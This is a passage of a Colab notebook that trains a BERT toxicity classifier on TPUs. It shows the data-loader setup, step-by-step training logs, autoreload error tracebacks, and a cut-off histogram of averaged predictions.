        "        batch_size=TrainGlobalConfig.batch_size,\n",
        "        sampler=validation_sampler,\n",
        "        pin_memory=False,\n",
        "        drop_last=False,\n",
        "        num_workers=TrainGlobalConfig.num_workers\n",
        "    )\n",
        "    validation_tune_sampler = torch.utils.data.distributed.DistributedSampler(\n",
        "        validation_tune_dataset,\n",
        "        num_replicas=xm.xrt_world_size(),\n",
        "        rank=xm.get_ordinal(),\n",
        "        shuffle=True\n",
        "    )\n",
        "    validation_tune_loader = torch.utils.data.DataLoader(\n",
        "        validation_tune_dataset,\n",
        "        batch_size=TrainGlobalConfig.batch_size,\n",
        "        sampler=validation_tune_sampler,\n",
        "        pin_memory=False,\n",
        "        drop_last=False,\n",
        "        num_workers=TrainGlobalConfig.num_workers\n",
        "    )\n",
        "    test_sampler = torch.utils.data.distributed.DistributedSampler(\n",
        "        test_dataset,\n",
        "        num_replicas=xm.xrt_world_size(),\n",
        "        rank=xm.get_ordinal(),\n",
        "        shuffle=False\n",
        "    )\n",
        "    test_loader = torch.utils.data.DataLoader(\n",
        "        test_dataset,\n",
        "        batch_size=TrainGlobalConfig.batch_size,\n",
        "        sampler=test_sampler,\n",
        "        pin_memory=False,\n",
        "        drop_last=False,\n",
        "        num_workers=TrainGlobalConfig.num_workers\n",
        "    )\n",
        "\n",
        "    if rank == 0:\n",
        "        time.sleep(1)\n",
        "\n",
        "    fitter = TPUFitter(model=net, device=device, config=TrainGlobalConfig)\n",
        "    fitter.fit(train_loader, validation_loader)\n",
        "    fitter.run_tuning_and_inference(test_loader, validation_tune_loader)"
      ],
      "execution_count": 0,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "aKuUULH7l5W1",
        "outputId": "e7561416-59dc-4a13-ab8f-beef7da82e1f",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        }
      },
      "source": [
        "FLAGS={}\n",
        "xmp.spawn(_mp_fn, args=(FLAGS,), nprocs=8, start_method='fork')\n",
        "from datetime import date; today = date.today(); output_model_file='bert_tpu_trained.bin'\n",
        "torch.save(net.state_dict(), f\"{today}_{output_model_file}\")"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Fitter prepared. Device is xla:1\n",
            "\n",
            "2020-06-09T23:45:23.303731\n",
            "LR: 4e-05\n",
            "Train Step 0, loss: 0.00000, final_score: 0.00000, time: 0.67860\n",
            "Train Step 50, loss: 0.67207, final_score: 0.78718, time: 204.44684\n",
            "Train Step 100, loss: 0.59740, final_score: 0.87023, time: 260.70115\n",
            "Train Step 150, loss: 0.56328, final_score: 0.90525, time: 317.04242\n",
            "Train Step 200, loss: 0.54986, final_score: 0.91897, time: 372.94825\n",
            "Train Step 250, loss: 0.53812, final_score: 0.93007, time: 429.63693\n",
            "Train Step 300, loss: 0.53327, final_score: 0.93469, time: 486.20094\n",
            "Train Step 350, loss: 0.52802, final_score: 0.93974, time: 542.74300\n",
            "Train Step 400, loss: 0.52277, final_score: 0.94459, time: 598.91767\n",
            "Train Step 450, loss: 0.51923, final_score: 0.94844, time: 655.20520\n",
            "Train Step 500, loss: 0.51628, final_score: 0.95097, time: 713.71532\n",
            "Train Step 550, loss: 0.51442, final_score: 0.95274, time: 769.91258\n",
            "Train Step 600, loss: 0.51182, final_score: 0.95476, time: 826.27215\n",
            "Train Step 650, loss: 0.51001, final_score: 0.95645, time: 882.93292\n",
            "Train Step 700, loss: 0.50785, final_score: 0.95822, time: 940.95223\n",
            "Train Step 750, loss: 0.50672, final_score: 0.95939, time: 997.04793\n",
            "Train Step 800, loss: 0.50543, final_score: 0.96052, time: 1054.24464\n",
            "Train Step 850, loss: 0.50381, final_score: 0.96178, time: 1110.66796\n",
            "Train Step 900, loss: 0.50350, final_score: 0.96232, time: 1167.61511\n",
            "Train Step 950, loss: 0.50262, final_score: 0.96333, time: 1232.68376\n",
            "Train Step 1000, loss: 0.50177, final_score: 0.96421, time: 1290.25508\n",
            "Train Step 1050, loss: 0.50017, final_score: 0.96530, time: 1347.45492\n",
            "Train Step 1100, loss: 0.49947, final_score: 0.96593, time: 1406.59490\n",
            "Train Step 1150, loss: 0.49880, final_score: 0.96648, time: 1463.26279\n",
            "Train Step 1200, loss: 0.49778, final_score: 0.96717, time: 1520.54296\n",
            "Train Step 1250, loss: 0.49661, final_score: 0.96799, time: 1577.96631\n",
            "Train Step 1300, loss: 0.49571, final_score: 0.96877, time: 1635.21655\n",
            "Train Step 1350, loss: 0.49490, final_score: 0.96934, time: 1692.22288\n",
            "Train Step 1400, loss: 0.49453, final_score: 0.96973, time: 1749.64896\n",
            "Train Step 1450, loss: 0.49413, final_score: 0.97017, time: 1807.30791\n",
            "Train Step 1500, loss: 0.49335, final_score: 0.97068, time: 1864.10378\n",
            "Train Step 1550, loss: 0.49266, final_score: 0.97127, time: 1921.16693\n",
            "Train Step 1600, loss: 0.49200, final_score: 0.97177, time: 1978.22340\n",
            "Train Step 1650, loss: 0.49189, final_score: 0.97185, time: 2034.98944\n",
            "Train Step 1700, loss: 0.49153, final_score: 0.97219, time: 2092.30158\n",
            "Train Step 1750, loss: 0.49065, final_score: 0.97270, time: 2148.86113\n",
            "Train Step 1800, loss: 0.49049, final_score: 0.97290, time: 2205.77671\n",
            "Train Step 1850, loss: 0.48990, final_score: 0.97329, time: 2262.81527\n",
            "Train Step 1900, loss: 0.48945, final_score: 0.97365, time: 2319.82918\n",
            "Train Step 1950, loss: 0.48933, final_score: 0.97375, time: 2376.98965\n",
            "Train Step 2000, loss: 0.48896, final_score: 0.97405, time: 2433.98657\n",
            "Train Step 2050, loss: 0.48851, final_score: 0.97434, time: 2493.48898\n",
            "Train Step 2100, loss: 0.48830, final_score: 0.97447, time: 2550.84213\n",
            "Train Step 2150, loss: 0.48785, final_score: 0.97475, time: 2607.84596\n",
            "Train Step 2200, loss: 0.48749, final_score: 0.97496, time: 2664.85120\n",
            "Train Step 2250, loss: 0.48693, final_score: 0.97527, time: 2723.05707\n",
            "Train Step 2300, loss: 0.48659, final_score: 0.97552, time: 2780.67420\n",
            "[RESULT]: Train. Epoch: 0, loss: 0.48638, final_score: 0.97566, time: 2821.52710\n",
            "Valid Step 0, loss: 0.00000, final_score: 0.00000, time: 0.04427\n",
            "Valid Step 50, loss: 0.56594, final_score: 0.95925, time: 88.93965\n",
            "[RESULT]: Validation. Epoch: 0, loss: 0.56944, final_score: 0.95664, time: 132.64980\n",
            "\n",
            "2020-06-10T00:34:37.487618\n",
            "LR: 4e-05\n",
            "Train Step 0, loss: 0.00000, final_score: 0.00000, time: 0.95995\n",
            "Train Step 50, loss: 0.48141, final_score: 0.97861, time: 59.20679\n",
            "Train Step 100, loss: 0.48051, final_score: 0.97972, time: 117.63862\n",
            "Train Step 150, loss: 0.47397, final_score: 0.98302, time: 175.41920\n",
            "Train Step 200, loss: 0.47400, final_score: 0.98361, time: 234.83668\n",
            "Train Step 250, loss: 0.47057, final_score: 0.98480, time: 292.51932\n",
            "Train Step 300, loss: 0.46777, final_score: 0.98593, time: 350.17631\n",
            "Train Step 350, loss: 0.46848, final_score: 0.98535, time: 407.93597\n",
            "Train Step 400, loss: 0.46901, final_score: 0.98538, time: 465.45987\n",
            "Train Step 450, loss: 0.46787, final_score: 0.98588, time: 523.14394\n",
            "Train Step 500, loss: 0.46867, final_score: 0.98521, time: 582.08539\n",
            "Train Step 550, loss: 0.46829, final_score: 0.98539, time: 640.23504\n",
            "Train Step 600, loss: 0.46902, final_score: 0.98497, time: 698.54723\n",
            "Train Step 650, loss: 0.46910, final_score: 0.98504, time: 756.55596\n",
            "Train Step 700, loss: 0.46946, final_score: 0.98494, time: 814.51303\n",
            "Train Step 750, loss: 0.46951, final_score: 0.98487, time: 873.27279\n",
            "Train Step 800, loss: 0.46965, final_score: 0.98495, time: 932.06939\n",
            "Train Step 850, loss: 0.46919, final_score: 0.98505, time: 991.30912\n",
            "Train Step 900, loss: 0.46926, final_score: 0.98498, time: 1049.14203\n",
            "Train Step 950, loss: 0.46950, final_score: 0.98492, time: 1107.98267\n",
            "Train Step 1000, loss: 0.46993, final_score: 0.98487, time: 1165.75352\n",
            "Train Step 1050, loss: 0.46999, final_score: 0.98489, time: 1223.46619\n",
            "Train Step 1100, loss: 0.47016, final_score: 0.98484, time: 1282.04333\n",
            "Train Step 1150, loss: 0.47037, final_score: 0.98480, time: 1340.82409\n",
            "Train Step 1200, loss: 0.46976, final_score: 0.98498, time: 1399.28299\n",
            "Train Step 1250, loss: 0.47001, final_score: 0.98502, time: 1458.28448\n",
            "Train Step 1300, loss: 0.47001, final_score: 0.98504, time: 1516.12808\n",
            "Train Step 1350, loss: 0.46957, final_score: 0.98521, time: 1575.31774\n",
            "Train Step 1400, loss: 0.46968, final_score: 0.98514, time: 1634.21832\n",
            "Train Step 1450, loss: 0.46982, final_score: 0.98517, time: 1693.29412\n",
            "Train Step 1500, loss: 0.46975, final_score: 0.98524, time: 1751.44798\n",
            "Train Step 1550, loss: 0.46969, final_score: 0.98520, time: 1809.84465\n",
            "Train Step 1600, loss: 0.46963, final_score: 0.98524, time: 1868.00825\n",
            "Train Step 1650, loss: 0.46963, final_score: 0.98534, time: 1927.13745\n",
            "Train Step 1700, loss: 0.46977, final_score: 0.98539, time: 1986.11340\n",
            "Train Step 1750, loss: 0.46939, final_score: 0.98555, time: 2044.63173\n",
            "Train Step 1800, loss: 0.46909, final_score: 0.98568, time: 2103.34969\n",
            "Train Step 1850, loss: 0.46893, final_score: 0.98572, time: 2162.17697\n",
            "Train Step 1900, loss: 0.46876, final_score: 0.98578, time: 2221.81141\n",
            "Train Step 1950, loss: 0.46845, final_score: 0.98594, time: 2281.25764\n",
            "Train Step 2000, loss: 0.46836, final_score: 0.98599, time: 2339.89307\n",
            "Train Step 2050, loss: 0.46867, final_score: 0.98587, time: 2398.33197\n",
            "Train Step 2100, loss: 0.46832, final_score: 0.98600, time: 2457.56360\n",
            "Train Step 2150, loss: 0.46836, final_score: 0.98605, time: 2516.45768\n",
            "Train Step 2200, loss: 0.46816, final_score: 0.98614, time: 2575.29064\n",
            "Train Step 2250, loss: 0.46858, final_score: 0.98597, time: 2633.89244\n",
            "Train Step 2300, loss: 0.46885, final_score: 0.98592, time: 2692.24801\n",
            "[RESULT]: Train. Epoch: 1, loss: 0.46894, final_score: 0.98586, time: 2737.68178\n",
            "Valid Step 0, loss: 0.00000, final_score: 0.00000, time: 0.04613\n",
            "Valid Step 50, loss: 0.63359, final_score: 0.95872, time: 50.91685\n",
            "[RESULT]: Validation. Epoch: 1, loss: 0.63544, final_score: 0.95572, time: 63.45235\n",
            "Train Step 0, loss: 0.00000, final_score: 0.00000, time: 0.07880\n",
            "Train Step 50, loss: 0.48480, final_score: 0.94857, time: 119.47729\n",
            "Prediction Step 0, time: 0.05686\n",
            "Prediction Step 50, time: 27.25199\n",
            "Prediction Step 100, time: 42.43517\n",
            "Prediction Step 150, time: 57.62049\n",
            "Prediction Step 200, time: 72.73193\n",
            "Prediction Step 250, time: 87.84819\n",
            "Prediction Step 300, time: 103.00908\n",
            "Prediction Step 350, time: 118.21394\n",
            "Prediction Step 400, time: 133.34776\n",
            "Prediction Step 450, time: 148.46293\n",
            "Train Step 0, loss: 0.00000, final_score: 0.00000, time: 0.07922\n",
            "Train Step 50, loss: 0.46219, final_score: 0.96771, time: 60.06645\n",
            "Prediction Step 0, time: 0.05515\n",
            "Prediction Step 50, time: 15.27901\n",
            "Prediction Step 100, time: 30.41586\n",
            "Prediction Step 150, time: 45.59130\n",
            "Prediction Step 200, time: 60.76533\n",
            "Prediction Step 250, time: 75.90688\n",
            "Prediction Step 300, time: 91.09244\n",
            "Prediction Step 350, time: 106.28117\n",
            "Prediction Step 400, time: 121.47908\n",
            "Prediction Step 450, time: 136.62838\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab_type": "code",
        "id": "Wu0VhhZAFuYs",
        "outputId": "ac86e91e-804d-4d3d-9077-a1180ea6bc02",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        }
      },
      "source": [
        "submission = pd.concat([pd.read_csv(path) for path in glob('node_submissions/*.csv')]).groupby('id').mean()\n",
        "submission['toxic'].hist(bins=100)"
      ],
      "execution_count": 0,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "[autoreload of prompt_toolkit.buffer failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'IncrementalSearchDirection'\n",
            "]\n",
            "[autoreload of prompt_toolkit.filters.base failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'test_callable_args'\n",
            "]\n",
            "[autoreload of prompt_toolkit.history failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ValueError: __init__() requires a code object with 1 free vars, not 0\n",
            "]\n",
            "[autoreload of prompt_toolkit.search_state failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_simple_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.validation failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_simple_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.layout.containers failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.layout.controls failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.layout.lexers failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.layout.processors failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.layout.margins failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.renderer failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.styles failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "TypeError: Expected 8 arguments, got 7\n",
            "]\n",
            "[autoreload of prompt_toolkit.key_binding.registry failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.key_binding.bindings.vi failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "AttributeError: module 'prompt_toolkit' has no attribute 'filters'\n",
            "]\n",
            "[autoreload of prompt_toolkit.key_binding.defaults failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.shortcuts failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_simple_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.layout.menus failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.terminal.vt100_output failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_simple_filter'\n",
            "]\n",
            "[autoreload of prompt_toolkit.key_binding.manager failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'to_cli_filter'\n",
            "]\n",
            "[autoreload of jsonschema failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "ImportError: cannot import name 'draft6_format_checker'\n",
            "]\n",
            "[autoreload of jsonschema.validators failed: Traceback (most recent call last):\n",
            "  File \"/usr/local/lib/python3.6/dist-packages/IPython/extensions/autoreload.py\", line 247, in check\n",
            "    superreload(m, reload, self.old_objects)\n",
            "NameError: name '_coerce_args' is not defined\n",
            "]\n"
          ],
          "name": "stderr"
        },
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "<matplotlib.axes._subplots.AxesSubplot at 0x7f73e8e0a320>"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 32
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "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